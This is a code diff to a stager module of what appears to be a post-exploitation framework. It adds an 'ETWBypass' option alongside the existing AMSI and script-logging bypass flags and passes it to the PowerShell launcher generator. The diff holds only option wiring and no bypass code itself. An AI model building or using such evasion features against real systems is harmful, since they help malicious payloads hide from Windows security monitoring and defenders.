@@ -97,6 +97,11 @@ class Stager(object):
                 'Description'   :   'Include Tal Liberman\'s AMSI Bypass in the stager code.',
                 'Required'      :   False,
                 'Value'         :   'False'
+            },
+            'ETWBypass': {
+                'Description': 'Include tandasat\'s ETW bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
             }
         }
 
@@ -138,6 +143,7 @@ class Stager(object):
         scriptLogBypass = self.options['ScriptLogBypass']['Value']
         AMSIBypass = self.options['AMSIBypass']['Value']
         AMSIBypass2 = self.options['AMSIBypass2']['Value']
+        ETWBypass = self.options['ETWBypass']['Value']
 
         invokeObfuscation = False
         if obfuscate.lower() == "true":
@@ -155,6 +161,10 @@ class Stager(object):
         if AMSIBypass2.lower() == "true":
             AMSIBypass2Bool = True
 
+        ETWBypassBool = False
+        if ETWBypass.lower() == 'true':
+            ETWBypassBool =True
+
         # generate the python launcher code
         pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
 
@@ -168,7 +178,7 @@ class Stager(object):
             pypayload = formStr("str", match)
 
         # generate the powershell launcher code
-        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
+        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool, ETWBypass=ETWBypassBool)
 
         if poshlauncher == "":
             print(helpers.color("[!] Error in powershell launcher command generation."))
